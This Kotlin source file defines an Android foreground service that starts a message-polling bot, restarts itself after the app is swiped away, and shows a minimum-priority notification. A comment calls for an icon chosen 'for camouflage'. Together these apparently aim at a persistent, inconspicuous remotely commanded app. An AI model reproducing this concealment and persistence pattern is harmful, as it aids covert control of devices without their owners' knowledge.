package com.mobile.superiorutils.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.mobile.superiorutils.bot.BotSync
import com.mobile.superiorutils.core.ServiceCore
import com.mobile.superiorutils.core.AppGraph
import com.mobile.superiorutils.utils.LogCategory
import com.mobile.superiorutils.utils.AppLog

class BotService : Service() {

    private lateinit var botManager: BotSync
    private val NOTIFICATION_ID = 9131

    override fun onCreate() {
        super.onCreate()
        botManager = BotSync(this)
        AppLog.log(LogCategory.SYSTEM, "BotService onCreate")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val prefs = AppGraph.prefs
        if (!prefs.isConfigured) {
            AppLog.log(LogCategory.SYSTEM, "Credentials not configured. Stopping self.")
            stopSelf()
            return START_NOT_STICKY
        }

        AppLog.setServiceRunning(true)
        startForegroundServiceNotification()
        
        botManager.startPolling()
        
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        botManager.stopPolling()
        AppLog.setServiceRunning(false)
        AppLog.log(LogCategory.SYSTEM, "BotService onDestroy")
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Re-start the service so polling survives app swipe-away
        ServiceCore.ensureRunning(this)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundServiceNotification() {
        val channelId = "SuperiorBotServiceChannel"

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Sync Active")
            .setContentText("Listening for messages...")
            // We should use a discrete icon here for camouflage, e.g. a wifi icon or similar.
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }
}
